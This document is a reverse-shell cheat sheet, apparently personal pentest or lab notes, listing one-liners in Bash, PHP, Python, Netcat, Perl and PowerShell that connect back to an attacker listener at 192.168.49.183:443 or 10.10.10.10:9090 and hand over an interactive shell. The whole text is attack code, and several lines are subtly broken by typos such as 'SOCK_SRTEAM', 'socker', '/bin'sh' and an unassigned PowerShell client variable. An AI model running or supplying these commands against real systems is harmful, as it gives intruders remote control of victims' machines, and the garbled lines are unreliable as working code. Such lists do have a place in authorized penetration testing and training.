============================================================================================
[+ BASH]
bash -i >& /dev/tcp/192.168.49.183/443 0>&1
============================================================================================
[+ PHP]
php -r '$sock=fsockopen("192.168.49.183",443);exec("/bin/sh -i <&3 >&3 2>&3");'
============================================================================================
[+ PYTHON]
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_SRTEAM);s.connect(("192.168.49.183",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin'sh","-i"]);'
============================================================================================
[+ NETCAT]
rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.183 443 >/tmp/f
============================================================================================
[+ PERL]
perl -e 'use Socket;$i="192.168.49.183";$p=443;socker(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
============================================================================================
[+ POWERSHELL - Windows 11]
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10.",9090);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte=([text.encoding]::ASCI).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
============================================================================================
